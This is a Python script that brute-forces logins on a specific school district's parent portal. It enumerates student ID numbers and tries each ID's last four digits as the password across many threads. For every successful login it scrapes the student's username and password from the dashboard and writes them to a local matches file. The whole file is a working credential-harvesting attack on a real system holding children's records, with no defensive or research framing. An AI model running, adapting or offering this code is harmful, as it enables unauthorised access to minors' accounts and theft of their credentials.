import math
from colored import fg, attr
import mechanize
from bs4 import BeautifulSoup
import time
import threading
import logging

print("Welcome to the Portal Shitter thread script. Please input the amount of threads to be used, the threads will automatically loadbalance. Threads must be greater than 0! 1 is 0 etc.")
threads = int(input("Threads: "))

def thread(name, xrange, yrange):
    logging.info("Main    : starting thread " + str(name))
    if xrange == 0:
        xrange = 4600000000
    else:
        xrange = int("46" + str(xrange))
    yrange = int("46" + str(yrange))
    for x in range(xrange, yrange):
        br = mechanize.Browser()
        br.set_handle_equiv(True)
        br.set_handle_redirect(True)
        br.set_handle_referer(True)
        br.set_handle_robots(False)
        green = fg('#00FF00')
        orange = fg('#FFFF00')
        res = attr('reset')
        class user:
            firstname = "N/A"
            lastname = "N/A"
            studentid = "N/A"
            username = "N/A"
            password = "N/A"
            birthmonth = "N/A"
            school = "N/A"
            fullname = "N/A"

        class smurf:
            id = "N/A"
            full = "N/A"
            randid = "N/A"
        user = user()
        domain = "https://dashboard.okaloosaschools.com"
        br.open(domain + "/parentportal/PP000.pgm")
        br.select_form(nr=0)
        user.studentid = str(x)
        br.form['wrkuser'] = user.studentid
        br.form['wrkpasswd'] = user.studentid[-4:]
        print("[" + name + "] Checking " + user.studentid + "...")
        response = br.submit()
        try:
            br.select_form(nr=0)
        except mechanize._mechanize.FormNotFoundError:
            start = time.time()
            print("[RUN] " + green
                  + "Found " + user.fullname + "..." + res)
            soup = BeautifulSoup(br.response().read(), 'lxml')
            redirect = str(soup)[63:146]
            dashboard = domain + redirect
            br.open(dashboard)
            soup = BeautifulSoup(br.response().read(), 'lxml')
            tempCombo = []
            for span in soup.select("td span"):
                tempCombo.append(span.text)
            user.username = tempCombo[0]
            user.password = tempCombo[1]
            smurf.id = dashboard[69:101]
            smurf.full = domain + "/parentportal/PP013.pgm?SmurfId=" + \
                smurf.id + "&wrkcycle=02&wrkgrd=11&rcyear=2022"
            f = open("./assets/matches.txt", "a")
            f.write("Student ID: " + user.studentid + "\nUsername: "
                    + user.username + "\nPassword: " + user.password + "\n\n")
            f.close()
            end = time.time()
            delta = str(round(end - start, 2))
            print(" L " + green + "Scraped "
                  + user.studentid + "..." + res)
            print(" L " + green + "Scraped "
                  + user.username + "..." + res)
            print(" L " + green + "Scraped "
                  + user.password + "..." + res)
            print(" L " + green + "Scraped "
                  + smurf.id + "..." + res)
            print(" L " + orange + "Took " + delta
                  + "s to process match..." + res)
            pass

if __name__ == "__main__":
    format = "%(asctime)s: %(message)s"
    logging.basicConfig(format=format, level=logging.INFO, datefmt="%H:%M:%S")

    logging.info("Main    : creating " + str(threads) + " threads")
    # Use once
    num = math.floor(99999999 / threads)

    # Generate ranges
    rerun = 0
    for x in range(threads):
        # Generate vars
        name = "thread" + str(x)
        xRange = rerun
        yRange = xRange + num + 1
        if yRange == 100000000:
            yRange = 99999999

        # Get ready for next interation
        rerun = yRange

        # Start the thread
        t = threading.Thread(target=thread, args=(name, xRange, yRange))
        t.start()
